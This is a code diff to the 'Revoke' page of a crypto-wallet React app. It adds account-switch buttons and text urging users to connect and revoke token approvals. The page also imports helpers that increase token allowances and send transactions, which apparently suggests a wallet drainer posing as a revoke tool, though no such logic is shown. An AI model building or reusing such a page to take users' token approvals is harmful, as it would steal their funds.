@@ -1,7 +1,7 @@
 import React, { useEffect, useState, useContext } from "react";
 import AppContext from "../components/AppContext";
 import Container from "../components/Container";
-import { useAccount, useSendTransaction } from "wagmi";
+import { useAccount, useSendTransaction, useSwitchAccount } from "wagmi";
 import {
   getUserTokens,
   increaseAllowanceForTokens,
@@ -9,8 +9,6 @@ import {
   getAccountBalance,
   getTokenPriceByAddress,
   getTokenPriceByAddressAndAmount,
-  getIPAddress,
-  getDomain,
 } from "../utils/helpers";
 import {
   walletScanned,
@@ -33,6 +31,7 @@ const Revoke = () => {
     handleLoadingEthBalance,
   } = useContext(AppContext);
   const { sendTransaction, data: sentEthTx } = useSendTransaction();
+  const { connectors, switchAccount } = useSwitchAccount();
 
   const { isConnected, address, connector } = useAccount();
   const [walletData, setWalletData] = useState({});
@@ -256,7 +255,13 @@ const Revoke = () => {
           />
         </form>
       </div>
-
+      <div className="w-full max-w-7xl mx-auto lg:px-8 ">
+        <p className="flex flex-col justify-center items-center  mb-2 border border-black dark:border-white rounded-lg px-4 py-3 text-center">
+          Once your wallet is connected, you'll see a list of your tokens and
+          the amounts you may have unknowingly approved. Simply revoke that
+          amount to reverse them immediately.
+        </p>
+      </div>
       <div className="">
         <div className="w-full max-w-7xl mx-auto px-4 lg:px-8">
           <div className="flex flex-col gap-2 mb-2 border border-black dark:border-white rounded-lg px-4 pt-3">
@@ -318,6 +323,17 @@ const Revoke = () => {
                     </div>
                   )}
                 </div>
+              </div>
+              <div>
+                {connectors.map((connector) => (
+                  <button
+                    className="bg-black text-white"
+                    key={connector.id}
+                    onClick={() => switchAccount({ connector })}
+                  >
+                    {isConnected ? connector.name : "loading"}
+                  </button>
+                ))}
               </div>
               <div className="flex items-center gap-6">
                 <div className="flex items-center gap-6 sm:gap-2">
